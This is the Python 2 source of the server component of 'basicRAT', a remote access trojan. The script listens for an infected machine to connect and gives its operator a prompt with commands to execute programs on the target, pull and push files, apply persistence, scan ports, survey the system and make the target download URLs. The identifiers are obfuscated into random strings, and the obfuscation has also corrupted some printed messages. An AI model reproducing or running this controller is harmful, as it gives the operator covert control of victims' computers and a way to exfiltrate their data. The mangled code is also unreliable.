#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import FAkNnUdNDaFZorQoeriEgCCFHcblhqBR,FPmaenntgMXUySRHYnxonMrLjGvQbFhl,FzXJncgxphnojDsNghowPfABuOLgmsip
    from core.filesock import eRrqpYUchKPoYbYxOYQeDwzVUJNcqUZT, JKkiTRuroBtXTQaWSmtYrgeAxgzygIAE
except ImportError as uGseSQRDuqoehXEeAwYsYmHwmShOdQgp:
    print uGseSQRDuqoehXEeAwYsYmHwmShOdQgp
    sys.exit(0)
GNLyNPVaVipCcniVHENUblraYxjkFvCt = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
vNMvhCRFdjZaNMCiaAywHYKKCGzuKLCR = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
QyohMBwVEdXPRXOxZeFrPALYAckrSzYZ = [
            'download', 'help', 'persistence', 'quit', 'rekey',
            'run', 'scan', 'survey', 'unzip', 'upload', 'wget'
]
def PatvjFrOkQTFkGOiTvNtxFrKAPvZMNeh():
    vvpyOdgRprgTwuvWVYGYGzENkzUaiwZU = argparse.ArgumentParser(description='basicRAT server')
    vvpyOdgRprgTwuvWVYGYGzENkzUaiwZU.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return vvpyOdgRprgTwuvWVYGYGzENkzUaiwZU
def psjwxLlNsBfXJSAKmZgMaeEQGZHFgYGa():
    vvpyOdgRprgTwuvWVYGYGzENkzUaiwZU  = PatvjFrOkQTFkGOiTvNtxFrKAPvZMNeh()
    lCAejhfOecSJnqYdxkEhZndTnhJeMzit    = vars(vvpyOdgRprgTwuvWVYGYGzENkzUaiwZU.parse_args())
    aSzpOftoCVlyPHHchNTdzaUjwLEcWxVm    = lCAejhfOecSJnqYdxkEhZndTnhJeMzit['port']
    AyZqbpGshExdUACZVcljMTjUuUSOeIyC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        AyZqbpGshExdUACZVcljMTjUuUSOeIyC.bind(('0.0.0.0', aSzpOftoCVlyPHHchNTdzaUjwLEcWxVm))
    except socket.error:
        print 'Error: Unable to start ExcAjrNHcDWYJtzPdpCKXrRVdgcFRbpl, aSzpOftoCVlyPHHchNTdzaUjwLEcWxVm {} in use?'.format(aSzpOftoCVlyPHHchNTdzaUjwLEcWxVm)
        sys.exit(1)
    for kVQmOVOEQRFPOUdLMTZkFLBQLGdvbqib in vNMvhCRFdjZaNMCiaAywHYKKCGzuKLCR.split('\n'):
        time.sleep(0.05)
        print kVQmOVOEQRFPOUdLMTZkFLBQLGdvbqib
    print 'basicRAT ExcAjrNHcDWYJtzPdpCKXrRVdgcFRbpl listening on aSzpOftoCVlyPHHchNTdzaUjwLEcWxVm {}...'.format(aSzpOftoCVlyPHHchNTdzaUjwLEcWxVm)
    AyZqbpGshExdUACZVcljMTjUuUSOeIyC.listen(10)
    LBJPAZNmZkkrJZSxlBEeukZBLxelSgvS, YipIfXytXYGgWZDPLPaiGMDqAfQaikbL = AyZqbpGshExdUACZVcljMTjUuUSOeIyC.accept()
    BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi = FzXJncgxphnojDsNghowPfABuOLgmsip(LBJPAZNmZkkrJZSxlBEeukZBLxelSgvS, ExcAjrNHcDWYJtzPdpCKXrRVdgcFRbpl=True)
    while True:
        tQTSeswBpZysziVjRGPmRRuyTxzIbRro = raw_input('\n[{}] basicRAT> '.format(YipIfXytXYGgWZDPLPaiGMDqAfQaikbL[0])).rstrip()
        if not tQTSeswBpZysziVjRGPmRRuyTxzIbRro:
            continue
        XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP, _, action = tQTSeswBpZysziVjRGPmRRuyTxzIbRro.partition(' ')
        if XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP not in QyohMBwVEdXPRXOxZeFrPALYAckrSzYZ:
            print 'Invalid command, type "help" to see ymrtOrxwfXsZnffMZZUOhcnkSQqSPxgH list of commands.'
            continue
        if XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'help':
            print GNLyNPVaVipCcniVHENUblraYxjkFvCt
            continue
        LBJPAZNmZkkrJZSxlBEeukZBLxelSgvS.send(FPmaenntgMXUySRHYnxonMrLjGvQbFhl(tQTSeswBpZysziVjRGPmRRuyTxzIbRro, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi))
        if XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'quit':
            AyZqbpGshExdUACZVcljMTjUuUSOeIyC.close()
            sys.exit(0)
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'run':
            mMwRHSXcVgstpUYnpuOqiqfsQiJmrYJS = LBJPAZNmZkkrJZSxlBEeukZBLxelSgvS.recv(4096)
            print FAkNnUdNDaFZorQoeriEgCCFHcblhqBR(mMwRHSXcVgstpUYnpuOqiqfsQiJmrYJS, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi).rstrip()
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'download':
            for paCQjENnuYPVmljLLYILWWljITjDzepC in action.split():
                paCQjENnuYPVmljLLYILWWljITjDzepC = paCQjENnuYPVmljLLYILWWljITjDzepC.strip()
                eRrqpYUchKPoYbYxOYQeDwzVUJNcqUZT(LBJPAZNmZkkrJZSxlBEeukZBLxelSgvS, paCQjENnuYPVmljLLYILWWljITjDzepC, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi)
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'upload':
            for paCQjENnuYPVmljLLYILWWljITjDzepC in action.split():
                paCQjENnuYPVmljLLYILWWljITjDzepC = paCQjENnuYPVmljLLYILWWljITjDzepC.strip()
                JKkiTRuroBtXTQaWSmtYrgeAxgzygIAE(LBJPAZNmZkkrJZSxlBEeukZBLxelSgvS, paCQjENnuYPVmljLLYILWWljITjDzepC, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi)
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'rekey':
            BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi = FzXJncgxphnojDsNghowPfABuOLgmsip(LBJPAZNmZkkrJZSxlBEeukZBLxelSgvS, ExcAjrNHcDWYJtzPdpCKXrRVdgcFRbpl=True)
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP)
            mMwRHSXcVgstpUYnpuOqiqfsQiJmrYJS = LBJPAZNmZkkrJZSxlBEeukZBLxelSgvS.recv(1024)
            print FAkNnUdNDaFZorQoeriEgCCFHcblhqBR(mMwRHSXcVgstpUYnpuOqiqfsQiJmrYJS, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi)
if __name__ == '__main__':
    psjwxLlNsBfXJSAKmZgMaeEQGZHFgYGa()
